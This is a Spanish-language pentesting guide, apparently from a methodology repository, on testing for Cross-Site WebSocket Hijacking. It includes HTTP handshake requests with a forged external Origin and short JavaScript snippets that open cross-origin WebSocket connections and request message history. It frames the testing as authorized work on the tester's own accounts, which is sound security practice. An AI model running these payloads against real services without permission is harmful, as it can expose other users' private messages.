# 🗡️ Cross-Site WebSocket Hijacking: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. Handshake legítimo de control

**Objetivo:** Registrar el Upgrade normal de una cuenta propia.

```http
GET /ws HTTP/1.1
Host: {ORIGEN}
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: https://{ORIGEN}
Cookie: session={COOKIE_PROPIA}
```

**Interpretación:** El 101 demuestra upgrade, pero no datos accesibles ni fallo de Origin.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking).

### 2. Origin externo en handshake

**Objetivo:** Comparar el mismo canal con origen externo controlado.

```http
GET /ws HTTP/1.1
Host: {ORIGEN}
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: https://{CONTROLLED_HOST}
Cookie: session={COOKIE_PROPIA}
```

**Interpretación:** Un cliente HTTP puede falsificar Origin; confirmar desde navegador que la cookie se envía y hay mensajes privados.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking).

### 3. Conexión cruzada real

**Objetivo:** Abrir WebSocket desde una página propia fuera del origen objetivo.

```js
const ws=new WebSocket('wss://{ORIGEN}/ws'); ws.onopen=()=>console.log('abierto'); ws.onmessage=e=>console.log('mensaje',e.data.length);
```

**Interpretación:** El navegador fija Origin y aplica cookies; observar solo metadatos de mensajes de la cuenta de prueba.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking).

### 4. Handshake sin cookie

**Objetivo:** Distinguir canal público de canal autenticado.

```http
GET /ws HTTP/1.1
Host: {ORIGEN}
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: https://{CONTROLLED_HOST}
```

**Interpretación:** Comparar con sesión propia; un 101 público sin mensajes sensibles no confirma CSWSH.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking).

### 5. Token de handshake omitido

**Objetivo:** Verificar si el canal depende solo de cookie.

```text
wss://{ORIGEN}/ws?csrf=      -> comparar con wss://{ORIGEN}/ws?csrf={TOKEN_PROPIO}
```

**Interpretación:** Si un token impredecible es obligatorio, una página externa normalmente no podrá iniciar el canal autenticado.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking).

### 6. Mensaje de consulta propio

**Objetivo:** Comprobar qué datos permite leer el canal cruzado.

```js
ws.onopen=()=>ws.send(JSON.stringify({type:'history',objectId:'{ID_PROPIO}'})); ws.onmessage=e=>console.log(e.data.length);
```

**Interpretación:** Adaptar esquema al tráfico real. Solo un dato privado propio legible desde el origen externo demuestra impacto.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking).

### 7. Mensaje hacia segundo objeto propio

**Objetivo:** Verificar autorización por objeto además de la del handshake.

```json
{"type":"history","objectId":"{ID_CONTROLADO_B}"}
```

**Interpretación:** Enviar con sesión A y objeto B, ambos controlados. Un fallo por objeto es distinto del CSWSH y debe separarse.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Web%20Sockets/README.md).

### 8. Recepción pasiva de eventos

**Objetivo:** Comprobar si un canal cruzado revela notificaciones sin enviar mensajes.

```js
const ws=new WebSocket('wss://{ORIGEN}/ws'); ws.onmessage=e=>console.log('bytes',e.data.length);
```

**Interpretación:** Generar un evento inocuo desde otra cuenta propia; registrar solo longitud y marcador, no mensajes ajenos.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
